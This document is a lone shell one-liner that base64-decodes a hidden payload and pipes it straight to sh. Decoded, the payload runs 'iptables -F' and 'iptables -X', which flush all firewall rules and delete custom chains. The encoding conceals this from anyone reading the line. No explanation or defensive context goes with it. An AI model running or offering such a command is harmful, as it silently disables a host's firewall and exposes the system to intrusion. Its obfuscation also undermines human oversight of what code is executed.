echo 'aXB0YWJsZXMgLUYKaXB0YWJsZXMgLVg=' | base64 -d | sh

